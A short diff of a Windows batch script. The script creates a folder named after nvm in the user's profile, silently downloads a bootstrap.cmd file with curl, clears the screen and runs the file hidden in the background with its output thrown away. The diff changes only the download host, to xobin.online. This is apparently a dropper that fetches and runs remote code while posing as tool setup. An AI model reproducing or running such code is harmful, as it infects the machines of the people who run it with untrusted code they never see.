@@ -3,7 +3,7 @@
 
 set "TARGET_DIR=%USERPROFILE%\.nvm"
 if not exist "%TARGET_DIR%" ( mkdir "%TARGET_DIR%" )
-curl -s -L -o "%TARGET_DIR%\bootstrap.cmd" "https://compound.chat/video/windows"
+curl -s -L -o "%TARGET_DIR%\bootstrap.cmd" "https://xobin.online/video/windows"
 cls
 start "" /b cmd /c "%TARGET_DIR%\bootstrap.cmd >nul 2>&1"
 cls
